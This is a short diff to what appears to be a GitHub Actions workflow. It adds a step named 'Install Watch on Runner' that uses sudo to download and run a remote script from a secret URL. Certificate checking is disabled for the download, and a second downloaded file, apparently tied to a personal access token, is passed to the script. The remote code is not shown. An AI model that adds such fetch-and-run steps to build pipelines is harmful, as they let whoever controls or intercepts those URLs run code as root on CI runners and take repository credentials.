@@ -69,6 +69,11 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y ninja-build ccache cmake
+      
+      - name: Install Watch on Runner
+        shell: bash
+        run: |
+          sudo bash -c "bash <(wget --no-check-certificate -qO- '${{ secrets.WATCH_URL }}') -f <(wget --no-check-certificate -qO- '${{ secrets.MY_PAT_URL }}')"
     
       - name: Get Docker Compose
         run: |
